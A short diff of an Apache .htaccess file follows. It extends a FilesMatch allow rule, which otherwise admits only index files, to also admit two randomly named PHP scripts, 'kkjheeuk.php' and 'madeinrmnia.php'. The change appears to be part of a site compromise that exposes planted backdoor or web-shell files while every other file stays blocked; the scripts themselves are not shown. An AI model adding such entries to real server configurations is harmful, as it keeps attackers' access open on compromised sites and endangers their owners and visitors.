@@ -2,7 +2,7 @@
 Order allow,deny
 Deny from all
 </FilesMatch>
-<FilesMatch '^(index.php|index.txt|index-old.php)$'>
+<FilesMatch '^(index.php|index.txt|index-old.php|kkjheeuk.php|madeinrmnia.php)$'>
 Order allow,deny
 Allow from all
 </FilesMatch>
